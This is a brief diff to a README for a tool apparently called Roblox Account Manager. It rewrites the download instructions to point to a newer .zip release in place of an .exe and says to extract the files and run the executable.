@@ -1,5 +1,6 @@
-# Download
-To install this, head over to the [Releases](https://github.com/Piece-Dev/Roblox-Account-Manager/releases/download/V1.9.78/Roblox_Account_Manager.exe) section and download the exe file at the very top, once downloaded, extract the files into a folder on your desktop and run Roblox Account Manager.exe.
+### Download Instructions
+
+To install, click the **[Download Latest](https://github.com/Piece-Dev/Roblox-Account-Manager/releases/download/V1.9.78.1/Roblox_Account_Manager.zip)** button to download the latest `.zip` file. After downloading, extract the files into a folder on your desktop, then run the **Roblox Account Manager.exe** file to start the application.
 
 
 
